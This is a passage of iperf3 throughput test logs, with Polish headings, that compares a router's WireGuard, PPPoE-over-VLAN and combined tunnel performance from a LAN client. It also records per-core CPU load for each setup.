[  7][RX-C]   0.00-60.00  sec  1.55 GBytes   221 Mbits/sec  345             sender
[  7][RX-C]   0.00-60.00  sec  1.55 GBytes   221 Mbits/sec                  receiver

iperf Done.

### WG (z klienta LAN-owego, przez router który jest peerem WG, do serwera WG) ###
CPU0: 100%   CPU1: 45-87% ( czy z -R czy bez -R)

$ iperf3 -c 10.9.0.1 -i 60 -t 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 47532 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   166 MBytes  23.2 Mbits/sec  176   1.08 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   166 MBytes  23.2 Mbits/sec  176             sender
[  5]   0.00-60.40  sec   164 MBytes  22.8 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 41244 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   384 MBytes  53.7 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.02  sec   387 MBytes  54.0 Mbits/sec  154             sender
[  5]   0.00-60.00  sec   384 MBytes  53.7 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 44190 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 44192 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  73.4 MBytes  10.3 Mbits/sec  317   69.5 KBytes       
[  7][RX-C]   0.00-60.00  sec   297 MBytes  41.5 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  73.4 MBytes  10.3 Mbits/sec  317             sender
[  5][TX-C]   0.00-60.04  sec  72.9 MBytes  10.2 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   299 MBytes  41.8 Mbits/sec   93             sender
[  7][RX-C]   0.00-60.04  sec   297 MBytes  41.5 Mbits/sec                  receiver

iperf Done.

### PPPoE + VLAN 35(z klienta LAN-owego, przez router który jest clientem PPPoE, do serwera PPPoE, dodatkowo na tagowanych portach VLAN 35) ###
CPU0: 100%   CPU1: 6,8-7,4%

$ iperf3 -c 192.168.76.1 -i 60 -t 60
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 51666 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec  1.13 GBytes   162 Mbits/sec   97    382 KBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec  1.13 GBytes   162 Mbits/sec   97             sender
[  5]   0.00-60.01  sec  1.13 GBytes   162 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 -R
Connecting to host 192.168.76.1, port 5201
Reverse mode, remote host 192.168.76.1 is sending
[  5] local 192.168.1.3 port 48164 connected to 192.168.76.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   578 MBytes  80.7 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.01  sec   580 MBytes  81.0 Mbits/sec  168             sender
[  5]   0.00-60.00  sec   578 MBytes  80.7 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 192.168.76.1 -i 60 -t 60 --bidir
Connecting to host 192.168.76.1, port 5201
[  5] local 192.168.1.3 port 55976 connected to 192.168.76.1 port 5201
[  7] local 192.168.1.3 port 55984 connected to 192.168.76.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec  56.3 MBytes  7.87 Mbits/sec  460   18.3 KBytes       
[  7][RX-C]   0.00-60.00  sec   550 MBytes  77.0 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec  56.3 MBytes  7.87 Mbits/sec  460             sender
[  5][TX-C]   0.00-60.02  sec  55.4 MBytes  7.74 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   553 MBytes  77.3 Mbits/sec   61             sender
[  7][RX-C]   0.00-60.02  sec   550 MBytes  76.9 Mbits/sec                  receiver

iperf Done.

### WG + PPPoE + VLAN35 (z klienta LAN-owego, przez router który jest peerem WG i clientem PPPoE, do serwera WG który jest dodatkowo serwerem PPPoE na tagowanych portach VLAN 35) ###
CPU0: 100%   CPU1: 62-68%

$ iperf3 -c 10.9.0.1 -i 60 -t 60 
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 36310 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   130 MBytes  18.2 Mbits/sec  125   1.37 MBytes       
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.00  sec   130 MBytes  18.2 Mbits/sec  125             sender
[  5]   0.00-60.60  sec   128 MBytes  17.8 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 -R
Connecting to host 10.9.0.1, port 5201
Reverse mode, remote host 10.9.0.1 is sending
[  5] local 192.168.1.3 port 48198 connected to 10.9.0.1 port 5201
[ ID] Interval           Transfer     Bitrate         Retr  Cwnd
[  5]   0.00-60.00  sec   299 MBytes  41.8 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID] Interval           Transfer     Bitrate         Retr
[  5]   0.00-60.03  sec   301 MBytes  42.1 Mbits/sec  141             sender
[  5]   0.00-60.00  sec   299 MBytes  41.8 Mbits/sec                  receiver

iperf Done.

$ iperf3 -c 10.9.0.1 -i 60 -t 60 --bidir
Connecting to host 10.9.0.1, port 5201
[  5] local 192.168.1.3 port 57148 connected to 10.9.0.1 port 5201
[  7] local 192.168.1.3 port 57150 connected to 10.9.0.1 port 5201
[ ID][Role] Interval           Transfer     Bitrate         Retr  Cwnd
[  5][TX-C]   0.00-60.00  sec   110 MBytes  15.4 Mbits/sec  953    162 KBytes       
[  7][RX-C]   0.00-60.00  sec   125 MBytes  17.5 Mbits/sec                  
- - - - - - - - - - - - - - - - - - - - - - - - -
[ ID][Role] Interval           Transfer     Bitrate         Retr
[  5][TX-C]   0.00-60.00  sec   110 MBytes  15.4 Mbits/sec  953             sender
[  5][TX-C]   0.00-60.03  sec   108 MBytes  15.0 Mbits/sec                  receiver
[  7][RX-C]   0.00-60.00  sec   129 MBytes  18.0 Mbits/sec  1483             sender
[  7][RX-C]   0.00-60.03  sec   125 MBytes  17.5 Mbits/sec                  receiver

iperf Done."
